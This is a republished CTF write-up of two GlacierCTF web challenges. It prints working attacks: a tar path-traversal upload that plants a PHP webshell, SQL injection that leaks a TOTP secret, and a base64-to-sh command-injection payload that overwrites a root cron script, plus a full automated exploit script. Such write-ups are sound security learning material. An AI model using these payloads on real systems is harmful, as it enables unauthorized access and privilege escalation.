# 🌐 GlacierCTF Web Challenges Writeups

> **Original Source:** [GlacierCTF Web Challenges Writeups](https://medium.com/@ahmadshamius2/glacierctf-web-challenges-writeups-8ad269371d15)
> **Platform:** medium.com | **Category:** `WEB` | **Event:** GlacierCTF

---

## 📝 Full Writeup

GlacierCTF Web Challenges Writeups[![snaggy](https://web.archive.org/web/20250308133643im_/https://miro.medium.com/v2/resize:fill:88:88/1*cb9R7KZ1AWP_0NDoIJgJAQ.jpeg)

](/web/20250308133643/https://medium.com/@ahmadshamius2?source=post_page---byline--8ad269371d15---------------------------------------)

[snaggy](/web/20250308133643/https://medium.com/@ahmadshamius2?source=post_page---byline--8ad269371d15---------------------------------------)

·
[Follow](/web/20250308133643/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F72b59c4eb12f&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmadshamius2%2Fglacierctf-web-challenges-writeups-8ad269371d15&user=snaggy&userId=72b59c4eb12f&source=post_page-72b59c4eb12f--byline--8ad269371d15---------------------post_header------------------)

·
Nov 25, 2024

[

](/web/20250308133643/https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2F8ad269371d15&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ahmadshamius2%2Fglacierctf-web-challenges-writeups-8ad269371d15&user=snaggy&userId=72b59c4eb12f&source=---header_actions--8ad269371d15---------------------clap_footer------------------)

--



GlacierCTF Logo
In this post I’ll be going over my attempt at GlacierCTF, one of the most challenging CTFs I’ve ever played throughout the years. The challenging bit wasn’t just the challenges being brutal, but also the competition’s duration being just 1 day long.

This time I didn’t manage to tinker a lot with reversing challenges (and to be completely honest the low number of solves discouraged me from going all in), so I stuck with web challenges.
Table of Contents
- FuzzyBytes (web)

- GlacierChat (web)

FuzzyBytes
One thing I want to point out before delving into the solutions of those challenges is the amount of attention put into building these challenges. Too much detail, checksums, pretty designs, whole files dedicated to just headers/footers and even some functionality that is completely unrelated to the solution. All those details, although they provide a sense of richness, they do force the player to waste a bit of time (which isn’t a luxury in this challenge). But to be completely fair I did like the quality overall. Just thought it would be a good idea to point that out as I might not mention some parts of the source code/application elements that are unrelated to the challenge.

So to start of, I spun up the challenge provided docker container and navigated to the page:

The website Index/Home page
The home page prompts us to upload a file to the site so it “scans it for viruses” a bit like [VirusTotal](https://web.archive.org/web/20250308133643/https://www.virustotal.com/gui/home/upload). The only difference here is that the only supported file type is a gunzipped tarball archive ending with`.tar.gz`

Playing so much of web CTFs in the past (and HTB boxes), my mind immediately pointed me to a [ZipSlip vulnerability](https://web.archive.org/web/20250308133643/https://security.snyk.io/research/zip-slip-vulnerability). Essentially, the vulnerability is oriented around compressed archives libraries and how they handle the files metadata associated with each compressed file/folder inside the archive. To put it simply, a compressed archive generally contains all the files and folders as a blob of data and distinguishes them when uncompressing the archive by that very metadata. So if a malicious actor is trying to force the system to uncompress the file “hello.txt” but specify it’s name as “../../../../../../tmp/hello.txt”, this will trick a vulnerable library/tool to write the file to the “/tmp” directory on a UNIX system rather than the current working directory.

To confirm my suspicion, let’s take at the source code of the app. The following code is from `upload.php` as the rest of the web app code is irrelevant (although the db file names gave me a good chuckle):

Irrelevant but hilarious
back to the code:

```
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
 $uploadDir = "/tmp/";
 $targetFile = $uploadDir . basename($_FILES["file"]["name"]);
 $fileExtension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
 $allowedExtensions = array('gz');

 echo '<div id="log"></div>';

 if (!in_array($fileExtension, $allowedExtensions)) {
 echo "Sorry, only .tar.gz files are allowed.";
 exit();
 }

 ob_start();

 
 function addLog($message) {
 echo "<script>document.getElementById('log').innerHTML += '$message<br>';</script>";
 ob_flush();
 flush();
 }

 addLog("Unpacking file...");
 
 if (move_uploaded_file($_FILES["file"]["tmp_name"], $targetFile)) {
 addLog("The file " . htmlspecialchars(basename($_FILES["file"]["name"])) . " has been uploaded.");

 if ($fileExtension === 'gz') {
 addLog("Scanning file...");

 // Execute python malware checker
 exec("python3 /usr/check_for_malicious_code.py " . escapeshellarg($targetFile), $output, $returnCode);

 if ($returnCode === 0) {
 addLog("Python script executed successfully.");
 } else {
 addLog("Error executing Python script.");
 }

 unlink($targetFile);
 addLog("Cleaning up...");

 addLog("Done.");

 }
 } else {
 addLog("Sorry, there was an error uploading your file.");
 }

 ob_end_flush();
}
?>

<link rel="stylesheet" type="text/css" href="styles.css">
<a href="index.php" class="back-button">Back to Homepage</a>
```

Without going into too much detail, the file name parsing looks relatively safe, so we can’t just upload a PHP file and call it a day. Rather we need to focus on what happens with the file itself.

```
// Execute python malware checker
 exec("python3 /usr/check_for_malicious_code.py " . escapeshellarg($targetFile), $output, $returnCode);
```

The above line points us to a subprocess that executes a pythonn script on the file itself after staging it so let’s take a deeper look on that file:

```
import sys
import tarfile
import os
import shutil

if len(sys.argv) != 2:
 print("Usage: python check_for_malicious_code.py <filename>")
 sys.exit(1)

tar_file_path = sys.argv[1]

try:
 with tarfile.open(tar_file_path, 'r:gz') as tar:
 if not os.path.exists("/tmp/files_for_checking"):
 os.mkdir("/tmp/files_for_checking")
 tar.extractall("/tmp/files_for_checking")
 print("Successfully extracted the contents of the .tar file.")
 
 # malware check here
 # redacted for commercial purposes

 shutil.rmtree("/tmp/files_for_checking")

except Exception as e:
 print(f"Error extracting .tar file: {str(e)}")
 sys.exit(1)
```

That python script simply uncompresses the archive and then deletes the uncompressed files, so my suspicion went directly to the `tarfile` python library.

If we take a look at [this page](https://web.archive.org/web/20250308133643/https://github.com/snyk/zip-slip-vulnerability) and specifically the table of vulnerable libraries, we see that this library is unpatched (maybe they consider zipslip to be a feature idk…)

Since the web app is running PHP, we can simply traverse our way into writing a PHP webshell in the web root defined in the Dockerfile:

```
COPY ./web /var/www/html
```

To do this we can use [Evilarc](https://web.archive.org/web/20250308133643/https://github.com/ptoomey3/evilarc), a python script that can create an exploitable archive (bare in mind it’s written for python 2.7).

first we must create our malicious file, let’s call it `cmd.php` :

```
<?php echo system($_GET["x"]); ?> 
```

Then we can use the tool to create the archive:

```
python2.7 evilarc.py cmd.php -f mal.tar.gz -p ../../../../../../var/www/html -d 0 -o unix
```

Then we upload the file to the site, and there we go we get a webshell!

But now we have another problem, the flag file is set to only be accessible by the root user:

```
COPY ./flag.txt /root/flag.txt
```

Figuring out the solution to this cost me an embarrassingly long amount of time, because I didn’t read the whole Dockerfile…

```
RUN chmod +s /bin/tar
```

The last line of that file clearly states that the tar binary has the setuid binary, meaning it can read all files as the root user!

If we execute something like `tar --create tar.tar /root` to create an archive out of the /root directory, we get some weird output (probably the contents of the tarball) but also the flag at the end. The real flag was:

```
gctf{c0nGr4tZ_on_Z1p_sLiDinG_4nD_Tar_diving}
```

GlacierChat
For this one I have too admit, it was one of the hardest challenges I ever solved under pressure. And I am proud to be able to do so alone and be the 31st solve. It took me almost 9 hours and some sleep deprivation to solve it so I am proud 😌.

Anyways let’s get to solving the challenge! The challenge contains A LOT of code, and also very complex to speedrun, thus I needed a strategy to solve it as fast as I can.

Navigating to the web root `/` we immediately get redirected to `login.php` , thus we need to find a way to bypass it. Looking at `index.php` we see on top the following:

```
<?php
require_once __DIR__ . "/../utils/index.php";
$sessionID = getSessionID();
if(!$sessionID) {
 header("Location: /login.php");
 exit(0);
}
...
```

This means that after including all the middleware, it first checks for session cookies and thus we can’t call methods inside this file without proper authentication. The `getSessionID()` function didn’t seem vulnerable as it was just a wrapper to PHP built in session handlers so I didn’t invest time into them. Next move was to look at `login.php` itself.

without delving into the meat and bones of the file, it’s just a standard login process that sanitizes the input well, but also has a link to reset the password of the user. The only user present in the system is `admin` as indicated in `database.php` (again I’ll not delve into too much detail if they aren’t really important)

```
createUser("admin", random_str(64), getNewSecret()); // a random pass and random secret
```

```
INSERT INTO $users_table (username, password_hash, password_cost, totp_secret) VALUES (:name, :hash, :cost, :totp_secret)
```

As indicated in the file, each user will have a username, password hash and a totp code (which we will eventually encounter)

If we go through the password reset process nothing interesting will really happen:

so let’s take a look at `reset.php` to see what’s really going on:

```
<?php
require_once __DIR__ . "/../utils/index.php";
$sessionID = getSessionID();
if($sessionID) {
 header("Location: /");
 exit(0);
}
if(isset($_POST["form_name"]) && $_POST["form_name"] === "reset"
 && isset($_POST["username"]) && strlen($_POST["username"]) > 0
) {
 acquireDatabase();
 $username = $_POST["username"];
 $stmt = $db->prepare("SELECT * FROM $users_table WHERE username = :username");
 $stmt->bindValue(":username", $username, SQLITE3_TEXT);
 $res = $stmt->execute();

 $data = $res->fetchArray();
 if($data) {
 $tenant = isset($_POST["is_tenant"]) && $_POST["is_tenant"] === "1" ? getTenantID() : ""; // hidden parameter
 $reset_code = getResetCode($tenant);
 $stmt = $db->prepare("UPDATE $users_table SET reset_code = :reset_code WHERE id = :id");
 $stmt->bindValue(":id", $data["id"], SQLITE3_INTEGER);
 $stmt->bindValue(":reset_code", $reset_code, SQLITE3_TEXT);
 $res = $stmt->execute();
 }
 $msg = "You will receive a mail with reset instructions, if you have an account on our service.";
 releaseDatabase(); //Nothig important
}

require_once __DIR__ . "/../pages/header.php";
?>
<h2>Reset Password</h2>
<form method="POST"> 
 <?= isset($msg) ? '<div class="alert alert-secondary">'.$msg.'</div>' : '' ?>
 <input type="hidden" name="form_name" value="reset" />
 <input type="text" name="username" placeholder="Username" />
 <input type="submit" value="Reset" />
</form>
<a href="/">Back</a>
<?php require_once __DIR__ . "/../pages/footer.php"; ?>
```

if we look closely we see a hidden POST parameter called `is_tenant` , and there is a check on that parameter. if the parameter is set and the value is set to “1” the `$tenant` variable will be set to empty string `"` . Then that variable is being passed to the function `geResetCode()` found in `util.php` o let’s take a look at it:

```
function getResetCode($prefix = "") {
 $reset_code = $prefix . random_str(16);
 if($prefix !== "") echo "Warning: Reset code " . $reset_code . " uses custom prefix. Using a prefix is deprecated in future releases.";
 return $reset_code;
}
```

according to the code, if the argument provided is an empty string we get a warning containing the reset code! let’s try to pass the hidden parameter in burp:

sure enough we get the reset code, but where do we use it? well here comes the role of a hidden page called `set_new_password.php` :

if we try to set a new password indeed we can log in… sweet! But now we get into an annoying 2FA page that uses OTP.

This part alone took me the longest to solve. I started thinking of ways to attack OTP, but then I saw that the secret stored in the database is 8 characters long with a charset of 36 characters. So if I made a script that will bruteforce all possible secret keys and try to login with all possibilities it will take me ages (38⁸ possible combos). Also the live instance only lasts for 10 minutes so that’s not an option. And also bruteforcing the OTP code itself isn’t an option either since I will need to brute force a 6-digit code that only lasts for 30 seconds, so all odds are against me in that matter.

Here I decided to do an epic move in time and sanity management by patching the source code. Inside `totp.php` there is this checj that I changed so that it renders useless:

```
if(!verifySecret($totp_secret, $totp)) { // I added ! before the function
 setSessionID($totp_check);
 header("Location: /");
 exit(0);
 }
```

essentially `veriySecret()` returns a boolean and checks for the validity of the OTP code. Once I patched it I was able to continue solving other parts of the challenge. But for this writeup’s sake I’ll show the solution now so we follow the correct gradual path. Let’s crack that OTP thing!

Again that took me a ton of source code review to figure out but it was actually insane. The solution was inside `set_new_password.php` weirdly enough:

```
...
 $password_confirm = $_POST["password_confirm"];
 if($password == $password_confirm && str_contains(strtolower($username), "blob") === false) { // NOPE
 $stmt = $db->prepare("SELECT id FROM $users_table WHERE reset_code = :code");
 $stmt->bindValue(":code", $code, SQLITE3_TEXT);
 $res = $stmt->execute();
 $data = $res->fetchArray();
 if($data) {
 $id = $data["id"];
 $stmt = $db->prepare("SELECT password_cost FROM $users_table WHERE reset_code = :code AND username = '$username'"); 
 $stmt->bindValue(":code", $code, SQLITE3_TEXT);
 $stmt->bindValue(":username", $username, SQLITE3_TEXT);
 $res = $stmt->execute();
 $data = $res->fetchArray();
 if($data) {
 $password_cost = $data["password_cost"];
 $password_cost = $password_cost > 12 ? 12 : $password_cost;
 $password_cost = $password_cost < 5 ? 5: $password_cost;
 $password_hash = password_hash($password, PASSWORD_BCRYPT, array(
 "cost" => $password_cost 
 ));
...
```

A keen eye will notice that the above sql statement has an unsanitized `username` input, meaning we can exploit an SQLI here. Again this part also took me a VERY long time to solve due to injections not working out as they suppose to. I should also mention that the tenant ID is an 8 characters long string that is stored in `/tmp/tenant` :

```
function setNewTenantID() {
 $tenant = random_str(8);
 file_put_contents("/tmp/tenant", $tenant);
 return $tenant;
}
```

The reason I’m mentioning that is that the tenant ID makes up the users table name (inside `database.php`):

```
$users_table = "tenant_" . $tenant_id . "_users";
```

Thus we can know the table name after getting a reset code by just grabbing the first 8 characters of that code. So if the code is “9MUkV8yLpKp4m9aaxA5AkNI9” the table name will be “tenant_9MUkV8yL_users”.

For some reason if I inject the following in the username field it never succeeds:

```
admin'; UPDATE tenant_9MUkV8yL_users set totp_secret = "AAAAAAAA"; --
```

So if I try to get an OTP code using that secret it doesn’t work, and if I inspect it inside the docker image’s database it never changes.

To generate an OTP code we can use python:

```
import pyotp
print(pyotp.TOTP('AAAAAAAA').now())
```

To inspect the container we can do the following:

```
sudo docker exec -it chall-glacierchat bash # get the conatiner name with docker ps

# inside the container

apt install sqlite3
sqlite3 /tmp/db.sql

sqlite3> SELECT * FROM tenant_9MUkV8yL_users;
```

It seems like the PHP sqlite API wasn’t executing multiple statements although it should according to the documentation.

That left me fumbling for hours until I had a nap and got the crazy idea just when i woke up. Let’s try injecting this in the username field:

```
' or totp_secret like 'A%'; --
```

This essentially defeats the purpose of the username (since we are providing an empty string), and substitute it with a check against the user’s totp secret. If the totp secret starts with the letter ‘A’, the password will update to whatever we want, if not the password will remain the same.

The flow of the exploit
So we can create a script that will attempt to reset the password of the admin and guess the secret based on whether the login attempts are successful or not. We keep doing this over all 8 characters that compose the secret (I have a PoC that I’ll show at the end which also solves the whole challenge).

Now that we have the secret through our script, we can login as we did before and generate an OTP code with python and login.

After we login we reach the following page:

This page has a field that lets the admin user post a URL, it tries to parse it and then the admin can view the post and approve it. Also there is something that is spamming stupid jokes in the page which is so annoying to deal with while debugging.

Let’s see how the application parses those URLs. If we just provide any URL, and preview the request, we can see something like an image popping up. If we inspect the element we see this:

The image is being parsed by a base64 string returned from the application. If we decode that string we get the following:

As if the server tried to literally execute ‘http://google.com’ and returned an error… strange. Let’s dig deeper.

since this page is `index.php` , we must look at the part where posts are created on that page:

```
<?php
if(isset($_POST["form_name"]) && $_POST["form_name"] === "createPost"
 && isset($_POST["content_type"]) && strlen($_POST["content_type"]) > 0
 && isset($_POST["media_uri"]) 
 && isset($_POST["message"]) 
 && isset($_POST["password_protection"]) 
 && isset($_POST["content"]) 
) {
 $content_type = $_POST["content_type"];
 if($content_type === "media" && strlen($_POST["media_uri"]) > 0) {
 $password_protection = $_POST["password_protection"];
 $media_uri = $_POST["media_uri"];
 if(filter_var($media_uri, FILTER_VALIDATE_URL) !== FALSE) {
 $message = $_POST["message"];
 insertMediaContent($media_uri);
 $password_hash = hashContentPassword($password_protection);
 $last_insert_id = getLastInsertedPost();
 if($password_hash) protectPost($last_insert_id, $password_hash);
 requirePostApproval($last_insert_id, $message);
 } else {
 echo "Media must be an URI!";
 }
 }
 if($content_type === "text" && strlen($_POST["content"]) > 0) {
 insertTextContent($_POST["content"]);
 }
}
?>
```

The code tries to filter the URL provided by `[FILTER_VALIDATE_URL](https://web.archive.org/web/20250308133643/https://www.php.net/manual/en/filter.constants.php)` variable, which adheres to [RFC 2396](https://web.archive.org/web/20250308133643/http://www.faqs.org/rfcs/rfc2396.html). So we can’t just insert any arbitrary input, but we need to follow a specific format and use specific allowed characters. To start off, our input must start with this form: `scheme://<domain>/<path><other stuff>` . That format is one of the forms that could be used, of course there are others but that should work just fine for our purposes. But if we try to execute anything with that it will fail since the first command will always be a URL. Luckily for us we can use special characters like semicolons in such contexts:

```
http://google.com/aaa?x=;id
```

if we try to execute such thing in our terminl for example we get the following:

So let’s try doing so in the web app!

If we do the same and preview the content, then inspect the image base64 contents then deccode them, we get the following:

Awesome! we now have command injection! But we have a problem, spaces aren’t allowed in the RFC, and we can’t URL encode the space as `%20` or `+` since the application doesn’t URL decode the string, rather it passes it to a shell subprocess as is:

*utils/functions.php*

```
function insertMediaContent($media_uri) {
 global $db;
 acquireDatabase();
 $stmt = $db->prepare("INSERT INTO content (user, type, content, approved) VALUES (:user, :type, :content, 0)");
 $stmt->bindValue(":user", getSessionID());
 session_write_close();
 $media_command = escapeshellcmd("curl -s " . escapeshellarg($media_uri));
 $stmt->bindValue(":type", "media");
 $stmt->bindValue(":content", $media_uri);
 $stmt->execute();
 releaseDatabase();
}
```

This inserts the URL as is in the database. The “curl -s” line is just dead code, a decoy that doesn’t make it to the database whn someone posts the URL.

and this executes the URL as is when the URL is previewed:

```
function fetchMediaContent($id) {
 global $db;
 acquireDatabase();
 $stmt = $db->prepare("SELECT c.content 
 FROM content c 
 INNER JOIN approval_requests a
 ON c.id = a.post 
 WHERE a.id = :id");
 $stmt->bindValue(":id", $id, SQLITE3_INTEGER);
 $res = $stmt->execute();
 if(!$res) return releaseDatabase();
 $row = $res->fetchArray();
 if(!$row) return releaseDatabase();;

 $media_content = $row["content"];
 $fetched_content = shell_exec("$media_content 2>&1"); // Our URL is executed here
 $encodedStuff = base64_encode($fetched_content);
 releaseDatabase();
 return $encodedStuff;
}
```

So what I’m trying to say is that if we try to pass the URL as `[http://google.com/aaa?x=;cat%20/flag.txt](https://web.archive.org/web/20250308133643/http://google.com/aaa?x=%3Bcat+%2Fflag.txt)` we will be passing cat%20/flag.txt as is to a shell which will not work. How can we fix this? Well one reason I love Bash is due to the endless tricks it has, one of them is the `IFS` variable. As mentioned in this [forum](https://web.archive.org/web/20250308133643/https://unix.stackexchange.com/a/351509), we can substitute the spaces with `${IFS}` which translates to a space! So if we pass a URL as `http://google.com/aaa?x=;cat${IFS}/flag.txt` it will literally execute `cat /flag.txt` .

Unfortunately we are still not done here, as we have a problem with the permissions. In the Dockerfile, the flag file is set to be only readable by root:

```
RUN chmod 640 /flag.txt
```

So we need to find some PE bug to read that file. Here comes the role of `cron.php` . Remember those dumb jokes that are spamming the admin portal? Well they are being spammed by this script. This script in turn is being executed by `cron.sh` each 20 seconds:

```
#!/bin/sh

while true; do
 echo "[+] Running cronjob" 
 /usr/local/bin/php /var/www/cron.php 2>&1 &
 sleep 20 
done;
```

And that script gets called in `entrypoint.sh` . The thing about this file is that it’sbeing envoked in the Dockerile, meaning it’s being envoked by the root user. So if `cron.sh` is the child process of the entrypoint, and `cron.php` is the child of `cron.sh` , this means that anything running inside `cron.php` is being ran as root.

And since `cron.php` is in the web server root directory (/var/www/), and the web root is owned by the webserver user (www-data), this means that we can overwrite the contents of that file by executing the following command through the URL prompt:

```
http://google.com/aaa?x=;echo${IFS}'ZWNobyAiPD9waHAgZWNobyBzeXN0ZW0oJ2NhdCAvZmxhZy50eHQgPiAvdmFyL3d3dy9odG1sL2Fzc2V0cy9mbGFnLnR4dCcpOyA/PiIgPiAvdmFyL3d3dy9jcm9uLnBocA=='${IFS}|${IFS}base64${IFS}-d${IFS}|sh;
```

Here we are invoking a base64 string into a shell wich translates to:

```
echo "<?php echo system('cat /flag.txt > /var/www/html/assets/flag.txt'); ?>" > /var/www/cron.php
```

This command overwrites the content of `cron.php` to force it to copy the flag file to the web server’s assets directory.

Once we provide the URL to the page and preview the content, we can verify that the cron file is overwrittenn by the doccker shell:

Now that this is done, we should see the flag in `http://<challenge url>/assets/flag.txt` after waiting for a cron job to execute:

And FINALLY here’s the flag!

Now that’s done we can automate the whole process. Since I was automating the process of getting the TOTP secret, I decided to automate the whole thing to make it cooler:

And after executing it against the real target I got the real flag:

```
python3 sol.py https://e7b330d55020be29888912608523779a.glacierchat.web.glacierctf.com
Users table name: tenant_aUyITZTI_users
current pass: 8
TOTP secret key: YIACW4V6
[+] logging in
[+] providing the totp code
[+] overwriting cron.php
[+] waiting for a cron job to execute...
[+] reading the copy of the flag...
[*] your flag: gctf{Us3_PhP_Th3y_Sa!D_Y0U_W!lL_L0v3_iT_Th3Y_S2ID!!!!!}
```

The following is my script that I wrote to automate the challenge solution:

```
import requests, time
import sys
import pyotp

if len(sys.argv) < 2:
 print(f"Usage: python3 {sys.argv[0]} <target url>")
 exit(1)

global_url = sys.argv[1]

def get_reset_code():
 burp0_url = f"{global_url}/reset.php"
 burp0_data = {"form_name": "reset", "username": "admin", "is_tenant": "1"}
 reset_code_request = requests.post(burp0_url, data=burp0_data)

 return reset_code_request.text.splitlines()[0].split()[3]

table_name = "tenant_" + get_reset_code()[:-16] + "_users"

def enum_totp_key():
 charset = "ABCDEFGHIJKLMNPQRSTUVWXYZ234567"

 secret_key = ""
 success_index = 1
 while len(secret_key) < 8:
 
 for i in charset:

 reset_code = get_reset_code()

 burp0_url = f"{global_url}/set_new_password.php"
 burp0_data = {"form_name": "set_new_password", "code": reset_code, "username": f"' or totp_secret like '{secret_key}{i}%'; --", "password": f"{success_index}", "password_confirm": f"{success_index}"}
 requests.post(burp0_url, data=burp0_data)

 #login to verify if the password is set

 burp0_url = f"{global_url}/login.php"
 burp0_data = {"form_name": "login", "username": "admin", "password": f"{success_index}"}
 res = requests.post(burp0_url, data=burp0_data)
 if "Wrong credentials" in res.text:
 continue
 else:
 success_index += 1
 secret_key += i
 #print(secret_key) # verbose
 break
 print(f"current pass: {success_index - 1}") 
 print(f"TOTP secret key: {secret_key}")
 return secret_key, success_index - 1

if __name__ == '__main__':
 print(f"Users table name: {table_name}")
 totp_secret, password = enum_totp_key()

 session = requests.Session()
 
 print("[+] logging in")
 #login and get the 1st session cookie
 burp0_url = f"{global_url}/login.php"
 burp0_data = {"form_name": "login", "username": "admin", "password": f"{password}"}
 session.post(burp0_url, data=burp0_data)

 print("[+] providing the totp code")
 #get the session cookie from the OTP auth page
 current_otp = pyotp.TOTP(totp_secret).now() # possible race condition bug due to 30 sec time window but idc
 burp0_url = f"{global_url}/totp.php"
 burp0_data = {"form_name": "totp", "totp": f"{current_otp}"}
 session.post(burp0_url, data=burp0_data)
 
 #Post the request to get the flag
 print("[+] overwriting cron.php")
 burp0_url = f"{global_url}/"
 burp0_data = {"form_name": "createPost", "content_type": "media", "media_uri": "http://google.com/aaa?x=;echo${IFS}'ZWNobyAiPD9waHAgZWNobyBzeXN0ZW0oJ2NhdCAvZmxhZy50eHQgPiAvdmFyL3d3dy9odG1sL2Fzc2V0cy9mbGFnLnR4dCcpOyA/PiIgPiAvdmFyL3d3dy9jcm9uLnBocA=='${IFS}|${IFS}base64${IFS}-d${IFS}|sh;", "content": "ebay", "message": "ebay", "password_protection": ''}
 session.post(burp0_url, data=burp0_data)
 
 #Execute the payload on Preview

 burp0_url = f"{global_url}/"
 burp0_data = {"form_name": "preview_content", "id": "1"}
 session.post(burp0_url, data=burp0_data)

 print("[+] waiting for a cron job to execute...")
 time.sleep(20)
 print("[+] reading the copy of the flag...")
 
 flag = session.get(f"{global_url}/assets/flag.txt").text
 print(f"[*] your flag: {flag}")
```

Conclusion
That CTF was harder than I expected, as if it has almost the same difficulty as Google CTF competitions. At the en of the competition, or rather after finishing the second web challenge I was so tired that I couldn’t do the third one. Also I was a bit upset that I couldn’t try any of the reverse engineering challenges, but hey CTFs aren’t going anywhere right?

If you stuck around through this writeup let me what you think about this challenge, I’d love to hear your thoughts!

---

*📖 Originally published on [Medium](https://medium.com/@ahmadshamius2/glacierctf-web-challenges-writeups-8ad269371d15). All credit goes to the original author.*
*📂 Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
